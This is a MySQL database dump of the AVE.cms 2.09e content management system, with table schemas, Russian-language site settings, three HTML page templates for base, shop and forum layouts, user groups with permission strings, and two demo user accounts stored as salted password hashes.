INSERT INTO `cp_rubric_fields` VALUES (31, 3, 'Изображение (справа)', 'bild', 4, '', '[tag:if_notempty]<div class="contenticon">\r\n<img src="[cp:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" align="left" border="0" style="margin-right:.5em" />\r\n</div>[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[link]#more" class="image"><img src="[cp:path]index.php?thumb=[tag:parametr:0]" alt="[tag:parametr:1]" border="0" /></a>\r\n[/tag:if_notempty]');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_rubric_permissions`
-- 

CREATE TABLE `cp_rubric_permissions` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `user_group_id` smallint(3) unsigned NOT NULL,
  `rubric_permission` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `rubric_id` (`rubric_id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_rubric_permissions`
-- 

INSERT INTO `cp_rubric_permissions` VALUES (1, 1, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (2, 1, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (3, 1, 3, 'docread|new|editown');
INSERT INTO `cp_rubric_permissions` VALUES (4, 1, 4, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (5, 2, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (6, 2, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (7, 2, 3, 'docread|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (8, 2, 4, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (9, 3, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (10, 3, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (11, 3, 3, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (12, 3, 4, 'docread');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_rubric_template_cache`
-- 

CREATE TABLE `cp_rubric_template_cache` (
  `id` bigint(15) unsigned NOT NULL auto_increment,
  `hash` char(32) NOT NULL,
  `rub_id` smallint(3) NOT NULL,
  `grp_id` smallint(3) NOT NULL default '2',
  `doc_id` int(10) NOT NULL,
  `wysiwyg` enum('0','1') NOT NULL default '0',
  `expire` int(10) unsigned default '0',
  `compiled` longtext NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `rubric_id` (`rub_id`,`doc_id`,`wysiwyg`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_rubric_template_cache`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_rubrics`
-- 

CREATE TABLE `cp_rubrics` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `rubric_title` varchar(255) NOT NULL,
  `rubric_alias` varchar(255) NOT NULL,
  `rubric_template` text NOT NULL,
  `rubric_template_id` smallint(3) unsigned NOT NULL default '1',
  `rubric_author_id` int(10) unsigned NOT NULL default '1',
  `rubric_created` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `rubric_template_id` (`rubric_template_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_rubrics`
-- 

INSERT INTO `cp_rubrics` VALUES (1, 'Основные страницы', '', '<h2 id="page-heading">[tag:fld:4]</h2>\r\n[tag:fld:2][tag:fld:1]\r\n<div style="clear:both"></div>', 1, 1, 1250295071);
INSERT INTO `cp_rubrics` VALUES (2, 'Новости', 'новости/%Y-%m-%d', '<h2 id="page-heading">[tag:fld:10]</h2>\r\n[tag:fld:27]\r\n[tag:fld:6]\r\n[tag:fld:5]\r\n[mod_comment]', 1, 1, 1250295071);
INSERT INTO `cp_rubrics` VALUES (3, 'Статьи', 'article', '<h2 id="page-heading">[tag:fld:29]</h2>\r\n[tag:fld:31][tag:fld:30]', 1, 1, 1272800070);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_sessions`
-- 

CREATE TABLE `cp_sessions` (
  `sesskey` varchar(32) NOT NULL,
  `expiry` int(10) unsigned NOT NULL default '0',
  `value` text NOT NULL,
  `Ip` varchar(35) NOT NULL,
  `expire_datum` varchar(25) NOT NULL,
  PRIMARY KEY  (`sesskey`),
  KEY `expiry` (`expiry`),
  KEY `expire_datum` (`expire_datum`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_sessions`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_settings`
-- 

CREATE TABLE `cp_settings` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `site_name` varchar(255) NOT NULL,
  `mail_type` enum('mail','smtp','sendmail') NOT NULL default 'mail',
  `mail_content_type` enum('text/plain','text/html') NOT NULL default 'text/plain',
  `mail_port` smallint(3) unsigned NOT NULL default '25',
  `mail_host` varchar(255) NOT NULL,
  `mail_smtp_login` varchar(50) NOT NULL,
  `mail_smtp_pass` varchar(50) NOT NULL,
  `mail_sendmail_path` varchar(255) NOT NULL default '/usr/sbin/sendmail',
  `mail_word_wrap` smallint(3) NOT NULL default '50',
  `mail_from` varchar(255) NOT NULL,
  `mail_from_name` varchar(255) NOT NULL,
  `mail_new_user` text NOT NULL,
  `mail_signature` text NOT NULL,
  `page_not_found_id` int(10) unsigned NOT NULL default '2',
  `message_forbidden` text NOT NULL,
  `navi_box` varchar(255) NOT NULL,
  `start_label` varchar(255) NOT NULL,
  `end_label` varchar(255) NOT NULL,
  `separator_label` varchar(255) NOT NULL,
  `next_label` varchar(255) NOT NULL,
  `prev_label` varchar(255) NOT NULL,
  `total_label` varchar(255) NOT NULL,
  `date_format` varchar(25) NOT NULL default '%d.%m.%Y',
  `time_format` varchar(25) NOT NULL default '%d.%m.%Y, %H:%M',
  `default_country` char(2) NOT NULL default 'ru',
  `use_doctime` enum('1','0') NOT NULL default '1',
  `hidden_text` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_settings`
-- 

INSERT INTO `cp_settings` VALUES (1, 'AVE.cms 2.09e', 'mail', 'text/plain', 25, 'smtp.yourserver.ru', 'xxxxx', 'xxxxx', '/usr/sbin/sendmail', 50, 'info@avecms.ru', 'Admin', 'Здравствуйте %NAME%,\r\nВаша регистрация на сайте %HOST%. \r\n\r\nТеперь Вы можете войти на %HOST% со следующими данными:: \r\n\r\nПароль: %KENNWORT%\r\nE-Mail: %EMAIL%\r\n\r\n-----------------------\r\n%EMAILFUSS%\r\n\r\n', '--------------------\r\nOverdoze Team\r\nwww.overdoze.ru\r\ninfo@overdoze.ru\r\n--------------------', 2, '<h2>Ошибка...</h2>\r\n<br />\r\nУ Вас нет прав на просмотр этого документа!.', '<div class="page_navigation_box">%s</div>', 'Первая «', '» Последняя', '…', '»', '«', 'Страница %d из %d', '%d %B %Y', '%d %B %Y, %H:%M', 'ru', '0', '<div class="hidden_box">Содержимое скрыто. Пожалуйста, <a href="index.php?module=login&action=register">зарегистрируйтесь</a></div>');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_templates`
-- 

CREATE TABLE `cp_templates` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `template_title` varchar(255) NOT NULL,
  `template_text` longtext NOT NULL,
  `template_author_id` int(10) unsigned NOT NULL default '1',
  `template_created` int(10) unsigned NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_templates`
-- 

INSERT INTO `cp_templates` VALUES (1, 'ave_base', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<!--\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n\r\n\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery.form.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n-->\r\n\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/combine.php?css=reset.css,text.css,960.css,layout.css,nav.css,modules.css" media="screen" />\r\n<script type="text/javascript" src="[tag:mediapath]js/combine.php?js=jquery-1.3.2.min.js,jquery-ui.js,jquery.form.js,jquery-fluid16.js,common.js"></script>\r\n\r\n<!-- -->\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shCore.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushCss.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushJScript.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushPhp.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushPlain.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushSql.js"></script>\r\n	<script type="text/javascript" src="[tag:mediapath]syntaxhighlighter/scripts/shBrushXml.js"></script>\r\n	<link type="text/css" rel="stylesheet" href="[tag:mediapath]syntaxhighlighter/styles/shCore.css"/>\r\n	<link type="text/css" rel="stylesheet" href="[tag:mediapath]syntaxhighlighter/styles/shThemeDefault.css"/>\r\n	<script type="text/javascript">\r\n		SyntaxHighlighter.config.clipboardSwf = ''[tag:mediapath]syntaxhighlighter/scripts/clipboard.swf'';\r\n		SyntaxHighlighter.all();\r\n	</script>\r\n<!-- -->\r\n\r\n[/tag:if_notprint]\r\n</head>\r\n<body id="bodystyle">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- Блок логотипа -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - позволяет легко подключать новые шаблоны, сочетать их с любым дизайном, который только можно нарисовать.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Блок верхнего меню плюс поиск -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Основное содержимое -->\r\n  <div class="grid_12">\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="Версия для печати" /><br />\r\n<strong>Версия для печати</strong><br />\r\nПостоянный адрес страницы: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n[tag:maincontent]\r\n[tag:if_notprint] \r\n  </div>\r\n  <!-- Правая колонка меню и т.п. -->\r\n  <div class="grid_4">\r\n  \r\n  <!-- Правое меню -->\r\n    <div class="box menu">\r\n      <h2><a href="#" id="toggle-section-menu">Навигация по сайту</a></h2>\r\n      <div class="block" id="section-menu">[mod_navigation:1]</div>\r\n    </div>\r\n\r\n  <!-- Блок авторизации -->\r\n    <div class="box">\r\n      <h2><a href="#" id="toggle-login-forms">Авторизация</a></h2>\r\n      <div class="block" id="login-forms">[mod_login]</div>\r\n    </div>\r\n\r\n  <!-- Блок опросов -->\r\n    <div class="box">\r\n      <h2><a href="#" id="toggle-poll">Голосование</a></h2>\r\n      <div class="block" id="poll">[mod_poll:1]</div>\r\n    </div>\r\n\r\n<!--\r\n    [mod_ sysblock:20]\r\n-->\r\n\r\n	[mod_online]\r\n\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Подвал -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />Печать страницы</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="Создание сайтов" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1233055478);
INSERT INTO `cp_templates` VALUES (2, 'ave_shop', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<base href="[tag:home]">\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n[/tag:if_notprint]\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n</head>\r\n<body id="bodystyle" onload="setupZoom()">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- Блок логотипа -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - позволяет легко подключать новые шаблоны, сочетать их с любым дизайном, который только можно нарисовать.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Блок верхнего меню плюс поиск -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Основное содержимое -->\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="Версия для печати" /><br />\r\n<strong>Версия для печати</strong><br />\r\nПостоянный адрес страницы: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n[tag:maincontent]\r\n[tag:if_notprint] \r\n   <div class="clear"></div>\r\n  \r\n  <!-- Подвал -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />Печать страницы</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="Создание сайтов" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1233055478);
INSERT INTO `cp_templates` VALUES (3, 'ave_forum', '[tag:theme:ave]<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<base href="[tag:home]">\r\n<title>[tag:title]</title>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />\r\n<meta http-equiv="pragma" content="no-cache" />\r\n<meta name="Keywords" content="[tag:keywords]" />\r\n<meta name="Description" content="[tag:description]" />\r\n<meta name="robots" content="[tag:robots]" />\r\n[tag:if_print]\r\n<link href="[tag:mediapath]css/print.css" rel="stylesheet" type="text/css" media="all" />\r\n[/tag:if_print]\r\n[tag:if_notprint]\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/reset.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/text.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/960.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/layout.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/nav.css" media="screen" />\r\n<link rel="stylesheet" type="text/css" href="[tag:mediapath]css/modules.css" media="screen" />\r\n[/tag:if_notprint]\r\n<script>\r\n		var aveabspath = ''[tag:path]'';\r\n</script>\r\n</head>\r\n<body id="bodystyle" onload="setupZoom()">\r\n[tag:if_notprint]\r\n<div class="container_16">\r\n  <!-- Блок логотипа -->\r\n  <div class="grid_16 logobox">\r\n  <h1 id="branding"> <a href="[tag:home]" title="homepage">[tag:title]</a> </h1>\r\n  <div id="fon_header" style="background: url([tag:mediapath]images/fon_header.jpg) no-repeat left 0px;"><p><strong>AVE CMS</strong> - позволяет легко подключать новые шаблоны, сочетать их с любым дизайном, который только можно нарисовать.</p></div>\r\n  </div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Блок верхнего меню плюс поиск -->\r\n  <div class="grid_16" style="position:relative;">[mod_navigation:2]<div id="search">[mod_search]</div></div>\r\n  <div class="clear"></div>\r\n  \r\n  <!-- Основное содержимое -->\r\n  [/tag:if_notprint]\r\n[tag:if_print]\r\n<script language="JavaScript" type="text/javascript">\r\n<!--\r\nwindow.resizeTo(680,600);\r\nwindow.moveTo(1,1);\r\nwindow.print();\r\n//-->\r\n</script>\r\n<img src=" [tag:mediapath]images/logo_print.gif" alt="Версия для печати" /><br />\r\n<strong>Версия для печати</strong><br />\r\nПостоянный адрес страницы: [tag:document] <br />\r\n<hr noshade="noshade" size="1" /><br />\r\n[/tag:if_print]\r\n<div id="forums_content" class="grid_16">\r\n[tag:maincontent]\r\n</div>\r\n[tag:if_notprint] \r\n   <div class="clear"></div>\r\n  \r\n  <!-- Подвал -->\r\n  <div class="grid_16" id="site_info">\r\n    <div class="box">\r\n      <p><a target="_blank" href="[tag:printlink]"> \r\n<img src="[tag:mediapath]images/printer.gif" alt="" border="0" class="absmiddle" />Печать страницы</a> | \r\n[mod_recommend] | [tag:version]&nbsp;&nbsp;<a href="http://www.bitmap.ru" target="_blank"><img src="[tag:mediapath]images/bitmap_logo_44x17.gif" alt="Создание сайтов" width="44" height="17" border="0" class="absmiddle"  /></a></p>\r\n    </div>\r\n  </div>\r\n  <div class="clear"></div>\r\n</div>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-1.3.2.min.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-ui.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/jquery-fluid16.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoom.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/FancyZoomHTML.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/tabs.js"></script>\r\n<script type="text/javascript" src="[tag:mediapath]js/common.js"></script>\r\n<script type="text/javascript">\r\n$(document).ready(function(){\r\n	$(''.tab-container'').tabs();\r\n	tooltip();\r\n});\r\n</script>\r\n\r\n[/tag:if_notprint]\r\n</body>\r\n</html>', 1, 1231441011);

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_user_groups`
-- 

CREATE TABLE `cp_user_groups` (
  `user_group` smallint(3) unsigned NOT NULL auto_increment,
  `user_group_name` char(50) NOT NULL,
  `status` enum('1','0') NOT NULL default '1',
  `set_default_avatar` enum('1','0') NOT NULL default '0',
  `default_avatar` char(255) NOT NULL,
  `user_group_permission` char(255) NOT NULL,
  PRIMARY KEY  (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_user_groups`
-- 

INSERT INTO `cp_user_groups` VALUES (1, 'Администраторы', '1', '0', '', 'alles');
INSERT INTO `cp_user_groups` VALUES (2, 'Анонимные', '1', '0', '', '');
INSERT INTO `cp_user_groups` VALUES (3, 'Редакторы', '1', '0', '', 'adminpanel|documents|remarks|mediapool|mediapool_del');
INSERT INTO `cp_user_groups` VALUES (4, 'Зарегистрированные', '1', '0', '', '');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_users`
-- 

CREATE TABLE `cp_users` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `password` char(32) NOT NULL,
  `email` char(100) NOT NULL,
  `street` char(100) NOT NULL,
  `street_nr` char(10) NOT NULL,
  `zipcode` char(15) NOT NULL,
  `city` char(100) NOT NULL,
  `phone` char(35) NOT NULL,
  `telefax` char(35) NOT NULL,
  `description` char(255) NOT NULL,
  `firstname` char(50) NOT NULL,
  `lastname` char(50) NOT NULL,
  `user_name` char(50) NOT NULL,
  `user_group` smallint(3) unsigned NOT NULL default '4',
  `user_group_extra` char(255) NOT NULL,
  `reg_time` int(10) unsigned NOT NULL,
  `status` enum('1','0') NOT NULL default '1',
  `last_visit` int(10) unsigned NOT NULL,
  `country` char(2) NOT NULL default 'ru',
  `birthday` char(10) NOT NULL,
  `deleted` enum('0','1') NOT NULL default '0',
  `del_time` int(10) unsigned NOT NULL,
  `emc` char(32) NOT NULL,
  `reg_ip` char(20) NOT NULL,
  `new_pass` char(32) NOT NULL,
  `company` char(255) NOT NULL,
  `taxpay` enum('0','1') NOT NULL default '0',
  `salt` char(16) NOT NULL,
  `new_salt` char(16) NOT NULL,
  `user_ip` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `user_name` (`user_name`),
  KEY `user_group` (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_users`
-- 

INSERT INTO `cp_users` VALUES (1, '8cc76651e8df4d467b0a3c4020dac49d', 'admin@ave.ru', '', '', '', '', '', '', '', 'Д''артаньян', 'А''дмин', 'Admin', 1, '', 1250295071, '1', 1278618423, 'ru', '', '0', 0, '0', '0', 'a628592becaf509fa2ecc7f69a52dd79', '', '', ']3Wh[L5]Bd&1Yu1J', '+Hj(s~[LsL]G?V@~', 2130706433);
INSERT INTO `cp_users` VALUES (2, '545bae08d054452ad66e2469cbca1349', 'user@ave.ru', '', '', '', '', '', '', '<?>~!@#$%^&*()_+-=[]{}\\|/;:''",.`', 'Имя', 'User', 'User', 4, '', 1266891467, '1', 1278058797, 'ua', '', '0', 0, 'c56598f02963cbf87de83c41f8d87187', '127.0.0.1', '0', '', '0', 'wl%JK}xXT6D4}2n!', '', 2130706433);
